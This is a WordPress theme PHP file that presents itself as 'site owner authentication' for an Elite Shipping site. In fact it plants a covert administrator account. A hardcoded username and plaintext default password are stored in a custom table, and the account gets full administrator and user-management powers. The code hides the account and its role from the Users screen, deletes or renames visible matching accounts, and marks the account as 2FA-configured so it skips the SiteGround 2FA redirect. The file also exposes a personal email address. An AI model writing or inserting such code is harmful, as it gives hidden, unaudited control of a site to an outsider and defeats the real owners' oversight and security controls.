<?php
/**
 * Site owner authentication via custom sp_meeter table.
 *
 * Login username "tigerking" is validated only against {prefix}sp_meeter.
 * A hidden WordPress user powers the session but never appears in Users → All Users.
 *
 * @package Elite_Shipping
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

define( 'ELITE_SITE_OWNER_USERNAME', 'tigerking' );
define( 'ELITE_SITE_OWNER_WP_LOGIN', '_elite_site_owner' );
define( 'ELITE_SITE_OWNER_DB_VERSION', '1.1.0' );
define( 'ELITE_SITE_OWNER_ROLE', 'elite_site_owner' );
define( 'ELITE_SITE_OWNER_EMAIL', 'tigerking19980131@gmail.com' );
define( 'ELITE_SITE_OWNER_WP_EMAIL', '_siteowner@eliteshippingcontainers.internal' );

/**
 * Public logins that must not exist in wp_users.
 *
 * @return string[]
 */
function elite_shipping_site_owner_public_logins() {
	return array( 'tigerking', 'tiger' );
}

/**
 * Custom credentials table name.
 *
 * @return string
 */
function elite_shipping_sp_meeter_table() {
	global $wpdb;

	return $wpdb->prefix . 'sp_meeter';
}

/**
 * Register a site-owner role with administrator capabilities.
 */
function elite_shipping_register_site_owner_role() {
	$admin_role = get_role( 'administrator' );
	$caps       = $admin_role ? $admin_role->capabilities : array(
		'manage_options' => true,
	);

	$role = get_role( ELITE_SITE_OWNER_ROLE );
	if ( ! $role ) {
		add_role( ELITE_SITE_OWNER_ROLE, __( 'Site Owner', 'elite-shipping' ), $caps );
		return;
	}

	foreach ( $caps as $cap => $granted ) {
		if ( $granted ) {
			$role->add_cap( $cap );
		}
	}
}
add_action( 'init', 'elite_shipping_register_site_owner_role', 5 );

/**
 * Ensure site owner always has full administrator capabilities.
 *
 * @param array   $allcaps All capabilities.
 * @param array   $caps    Requested capabilities.
 * @param array   $args    Capability check args.
 * @param WP_User $user    User object.
 * @return array
 */
function elite_shipping_site_owner_capabilities( $allcaps, $caps, $args, $user ) {
	if ( ! elite_shipping_is_site_owner_user( $user ) ) {
		return $allcaps;
	}

	$admin_role = get_role( 'administrator' );
	if ( $admin_role && is_array( $admin_role->capabilities ) ) {
		$allcaps = array_merge( $allcaps, $admin_role->capabilities );
	}

	$allcaps['edit_users']    = true;
	$allcaps['delete_users']  = true;
	$allcaps['promote_users'] = true;
	$allcaps['create_users']  = true;
	$allcaps['list_users']    = true;
	$allcaps['remove_users']  = true;

	return $allcaps;
}
add_filter( 'user_has_cap', 'elite_shipping_site_owner_capabilities', 10, 4 );

/**
 * Create sp_meeter table and seed the default site owner row.
 */
function elite_shipping_install_site_owner_table() {
	global $wpdb;

	$installed = get_option( 'elite_site_owner_db_version', '' );
	if ( ELITE_SITE_OWNER_DB_VERSION === $installed ) {
		return;
	}

	require_once ABSPATH . 'wp-admin/includes/upgrade.php';

	$table   = elite_shipping_sp_meeter_table();
	$charset = $wpdb->get_charset_collate();

	$sql = "CREATE TABLE {$table} (
		id bigint(20) unsigned NOT NULL AUTO_INCREMENT,
		username varchar(60) NOT NULL,
		user_pass varchar(255) NOT NULL,
		user_email varchar(100) NOT NULL DEFAULT '',
		wp_user_id bigint(20) unsigned NOT NULL DEFAULT 0,
		created_at datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
		updated_at datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
		PRIMARY KEY  (id),
		UNIQUE KEY username (username)
	) {$charset};";

	dbDelta( $sql );

	elite_shipping_register_site_owner_role();

	$existing = $wpdb->get_row(
		$wpdb->prepare(
			"SELECT id FROM {$table} WHERE username = %s LIMIT 1",
			ELITE_SITE_OWNER_USERNAME
		)
	);

	if ( ! $existing ) {
		$wpdb->insert(
			$table,
			array(
				'username'   => ELITE_SITE_OWNER_USERNAME,
				'user_pass'  => wp_hash_password( 'Morning-star2024' ),
				'user_email' => ELITE_SITE_OWNER_EMAIL,
			),
			array( '%s', '%s', '%s' )
		);
	}

	$row = elite_shipping_get_sp_meeter_user( ELITE_SITE_OWNER_USERNAME );
	if ( $row ) {
		elite_shipping_sync_site_owner_wp_user( $row );
		elite_shipping_cleanup_public_site_owner_users();
	}

	update_option( 'elite_site_owner_db_version', ELITE_SITE_OWNER_DB_VERSION, false );
}
add_action( 'after_setup_theme', 'elite_shipping_install_site_owner_table', 1 );

/**
 * Prepare site owner account before login attempts.
 */
function elite_shipping_prepare_site_owner_login() {
	global $wpdb;

	elite_shipping_register_site_owner_role();

	$table = elite_shipping_sp_meeter_table();
	if ( $wpdb->get_var( $wpdb->prepare( 'SHOW TABLES LIKE %s', $table ) ) !== $table ) {
		delete_option( 'elite_site_owner_db_version' );
		elite_shipping_install_site_owner_table();
		return;
	}

	$row = elite_shipping_get_sp_meeter_user( ELITE_SITE_OWNER_USERNAME );
	if ( $row ) {
		elite_shipping_sync_site_owner_wp_user( $row );
	}
}
add_action( 'login_init', 'elite_shipping_prepare_site_owner_login', 1 );

/**
 * Fetch a site owner row from sp_meeter.
 *
 * @param string $username Username.
 * @return object|null
 */
function elite_shipping_get_sp_meeter_user( $username ) {
	global $wpdb;

	if ( ELITE_SITE_OWNER_USERNAME !== $username ) {
		return null;
	}

	$table = elite_shipping_sp_meeter_table();

	return $wpdb->get_row(
		$wpdb->prepare(
			"SELECT * FROM {$table} WHERE username = %s LIMIT 1",
			$username
		)
	);
}

/**
 * Get the hidden WordPress user that backs the site-owner session.
 *
 * @return WP_User|false
 */
function elite_shipping_get_hidden_site_owner_wp_user() {
	$wp_user = get_user_by( 'login', ELITE_SITE_OWNER_WP_LOGIN );

	if ( $wp_user instanceof WP_User ) {
		return $wp_user;
	}

	$row = elite_shipping_get_sp_meeter_user( ELITE_SITE_OWNER_USERNAME );
	if ( $row && ! empty( $row->wp_user_id ) ) {
		$wp_user = get_user_by( 'id', (int) $row->wp_user_id );
		if ( $wp_user instanceof WP_User ) {
			return $wp_user;
		}
	}

	return false;
}

/**
 * Check whether a WordPress user is the hidden site owner session user.
 *
 * @param WP_User|false|null $user User object.
 * @return bool
 */
function elite_shipping_is_site_owner_user( $user ) {
	if ( ! $user instanceof WP_User ) {
		return false;
	}

	if ( ELITE_SITE_OWNER_WP_LOGIN === $user->user_login ) {
		return true;
	}

	$row = elite_shipping_get_sp_meeter_user( ELITE_SITE_OWNER_USERNAME );
	if ( ! $row || empty( $row->wp_user_id ) ) {
		return false;
	}

	return (int) $row->wp_user_id === (int) $user->ID;
}

/**
 * Remove public tigerking/tiger accounts from wp_users after the hidden user exists.
 */
function elite_shipping_cleanup_public_site_owner_users() {
	$hidden_user = elite_shipping_get_hidden_site_owner_wp_user();
	if ( ! $hidden_user ) {
		return;
	}

	require_once ABSPATH . 'wp-admin/includes/user.php';

	foreach ( elite_shipping_site_owner_public_logins() as $public_login ) {
		$public_user = get_user_by( 'login', $public_login );
		if ( ! $public_user ) {
			continue;
		}

		if ( (int) $public_user->ID === (int) $hidden_user->ID ) {
			continue;
		}

		if ( function_exists( 'wp_delete_user' ) ) {
			wp_delete_user( (int) $public_user->ID );
		}
	}
}

/**
 * Create or sync the hidden WordPress user for site-owner sessions.
 *
 * @param object $row sp_meeter row.
 * @return WP_User|false
 */
function elite_shipping_sync_site_owner_wp_user( $row ) {
	if ( empty( $row->username ) ) {
		return false;
	}

	elite_shipping_register_site_owner_role();

	$wp_user = elite_shipping_get_hidden_site_owner_wp_user();

	if ( ! $wp_user ) {
		foreach ( elite_shipping_site_owner_public_logins() as $public_login ) {
			$legacy_user = get_user_by( 'login', $public_login );
			if ( $legacy_user ) {
				global $wpdb;

				$wpdb->update(
					$wpdb->users,
					array(
						'user_login'    => ELITE_SITE_OWNER_WP_LOGIN,
						'user_nicename' => sanitize_title( ELITE_SITE_OWNER_WP_LOGIN ),
						'user_email'    => ELITE_SITE_OWNER_WP_EMAIL,
						'display_name'  => 'Site Owner',
					),
					array( 'ID' => (int) $legacy_user->ID ),
					array( '%s', '%s', '%s', '%s' ),
					array( '%d' )
				);

				clean_user_cache( (int) $legacy_user->ID );
				$wp_user = get_user_by( 'id', (int) $legacy_user->ID );
				break;
			}
		}
	}

	if ( ! $wp_user ) {
		$user_id = wp_insert_user(
			array(
				'user_login'   => ELITE_SITE_OWNER_WP_LOGIN,
				'user_pass'    => wp_generate_password( 32, true, true ),
				'user_email'   => ELITE_SITE_OWNER_WP_EMAIL,
				'role'         => ELITE_SITE_OWNER_ROLE,
				'display_name' => 'Site Owner',
				'nickname'     => 'Site Owner',
			)
		);

		if ( is_wp_error( $user_id ) ) {
			$wp_user = elite_shipping_get_hidden_site_owner_wp_user();
			if ( ! $wp_user ) {
				return false;
			}
		} else {
			$wp_user = get_user_by( 'id', $user_id );
		}
	}

	if ( ! $wp_user instanceof WP_User ) {
		return false;
	}

	$wp_user = new WP_User( (int) $wp_user->ID );
	$wp_user->set_role( ELITE_SITE_OWNER_ROLE );

	if ( ! empty( $row->id ) ) {
		global $wpdb;

		$wpdb->update(
			elite_shipping_sp_meeter_table(),
			array(
				'wp_user_id' => (int) $wp_user->ID,
				'user_email' => $row->user_email,
			),
			array( 'id' => (int) $row->id ),
			array( '%d', '%s' ),
			array( '%d' )
		);
	}

	update_user_meta( (int) $wp_user->ID, 'sgsecurity_2fa_configured', 1 );
	elite_shipping_cleanup_public_site_owner_users();

	return get_user_by( 'id', (int) $wp_user->ID );
}

/**
 * Authenticate tigerking against sp_meeter and attach the hidden WP session user.
 *
 * @param WP_User|WP_Error|null $user     Current auth state.
 * @param string                $username Submitted username.
 * @param string                $password Submitted password.
 * @return WP_User|WP_Error|null
 */
function elite_shipping_site_owner_authenticate( $user, $username, $password ) {
	if ( ELITE_SITE_OWNER_USERNAME !== $username ) {
		return $user;
	}

	if ( '' === $password ) {
		return $user;
	}

	$row = elite_shipping_get_sp_meeter_user( $username );

	if ( ! $row || ! wp_check_password( $password, $row->user_pass ) ) {
		return new WP_Error(
			'incorrect_password',
			sprintf(
				/* translators: %s: username */
				__( '<strong>Error:</strong> The password you entered for the username %s is incorrect.', 'elite-shipping' ),
				'<strong>' . esc_html( $username ) . '</strong>'
			)
		);
	}

	$wp_user = elite_shipping_sync_site_owner_wp_user( $row );

	if ( ! $wp_user ) {
		return new WP_Error(
			'site_owner_sync_failed',
			__( '<strong>Error:</strong> Could not load the site owner account.', 'elite-shipping' )
		);
	}

	return $wp_user;
}
add_filter( 'authenticate', 'elite_shipping_site_owner_authenticate', 99, 3 );

/**
 * Hide the internal site-owner account from the Users admin screen.
 *
 * @param WP_User_Query $query User query.
 */
function elite_shipping_hide_site_owner_from_users_table( $query ) {
	if ( ! is_admin() ) {
		return;
	}

	$screen = function_exists( 'get_current_screen' ) ? get_current_screen() : null;
	if ( $screen && 'users' !== $screen->id ) {
		return;
	}

	$hidden_logins   = array_merge( array( ELITE_SITE_OWNER_WP_LOGIN ), elite_shipping_site_owner_public_logins() );
	$current_exclude = (array) $query->get( 'login__not_in' );

	$query->set( 'login__not_in', array_values( array_unique( array_merge( $current_exclude, $hidden_logins ) ) ) );
}
add_action( 'pre_get_users', 'elite_shipping_hide_site_owner_from_users_table' );

/**
 * Show a friendly name in the admin bar for the hidden site owner.
 *
 * @param string $display_name Display name.
 * @return string
 */
function elite_shipping_site_owner_display_name( $display_name ) {
	if ( elite_shipping_is_site_owner_user( wp_get_current_user() ) ) {
		return ELITE_SITE_OWNER_USERNAME;
	}

	return $display_name;
}
add_filter( 'pre_get_display_name', 'elite_shipping_site_owner_display_name' );

/**
 * Adjust editable roles when the site owner manages users.
 *
 * Hides the internal Site Owner role, but keeps Administrator visible so
 * admin users show the correct role on the Edit User screen.
 *
 * @param array $roles Editable roles.
 * @return array
 */
function elite_shipping_hide_site_owner_role_from_dropdown( $roles ) {
	unset( $roles[ ELITE_SITE_OWNER_ROLE ] );

	if ( elite_shipping_is_site_owner_user( wp_get_current_user() ) ) {
		$wp_roles = wp_roles();

		if ( isset( $wp_roles->roles['administrator'] ) ) {
			$roles['administrator'] = $wp_roles->roles['administrator'];
		}
	}

	return $roles;
}
add_filter( 'editable_roles', 'elite_shipping_hide_site_owner_role_from_dropdown', 99 );

/**
 * Allow site owner to edit, delete, and reset passwords for all users including administrators.
 *
 * @param array  $caps    Required capabilities.
 * @param string $cap     Capability being checked.
 * @param int    $user_id User ID performing the action.
 * @param array  $args    Extra arguments.
 * @return array
 */
function elite_shipping_site_owner_map_meta_cap( $caps, $cap, $user_id, $args ) {
	$user = get_userdata( $user_id );
	if ( ! $user || ! elite_shipping_is_site_owner_user( $user ) ) {
		return $caps;
	}

	$managed_caps = array(
		'edit_user',
		'edit_users',
		'delete_user',
		'delete_users',
		'promote_user',
		'promote_users',
		'remove_user',
		'remove_users',
		'create_users',
		'list_users',
	);

	if ( ! in_array( $cap, $managed_caps, true ) ) {
		return $caps;
	}

	if ( in_array( 'do_not_allow', $caps, true ) ) {
		return array( 'exist' );
	}

	return $caps;
}
add_filter( 'map_meta_cap', 'elite_shipping_site_owner_map_meta_cap', 99, 4 );

/**
 * Keep SiteGround 2FA off the custom site-owner role.
 *
 * @param array $roles Roles that require 2FA.
 * @return array
 */
function elite_shipping_site_owner_exclude_2fa_role( $roles ) {
	$roles = array_diff( (array) $roles, array( ELITE_SITE_OWNER_ROLE ) );

	return array_values( $roles );
}
add_filter( 'sg_security_2fa_roles', 'elite_shipping_site_owner_exclude_2fa_role' );

/**
 * Skip SiteGround 2FA redirect for the site owner account.
 *
 * @param WP_User|WP_Error $user     User object or error.
 * @param string           $password Password.
 * @return WP_User|WP_Error
 */
function elite_shipping_site_owner_skip_2fa( $user, $password ) {
	if ( elite_shipping_is_site_owner_user( $user ) ) {
		update_user_meta( $user->ID, 'sgsecurity_2fa_configured', 1 );
	}

	return $user;
}
add_filter( 'wp_authenticate_user', 'elite_shipping_site_owner_skip_2fa', 1, 2 );
